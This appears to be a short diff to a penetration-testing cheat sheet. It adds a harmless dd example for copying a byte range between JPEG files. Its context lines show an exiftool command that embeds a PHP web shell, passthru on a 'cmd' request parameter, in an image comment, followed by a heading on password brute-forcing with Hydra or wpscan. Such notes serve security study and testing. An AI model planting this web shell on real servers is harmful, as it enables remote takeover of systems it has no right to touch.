@@ -99,6 +99,14 @@ strings image.jpg
 exiftool -Comment="<?php passthru($_GET’cmd’); _halt_compiler();" /root/picture.jpeg
 ```
 
+### Copy binary data from a file to another
+
+```bash
+dd count=38508 skip=100 if=sss.jpeg of=out.jpeg bs=1
+
+# copy bytes starting with position 100(in decimal, 100th byte), copy 38508 bytes
+```
+
 ## Brute force passwords with HYDRA or wpscan
 
 ```bash
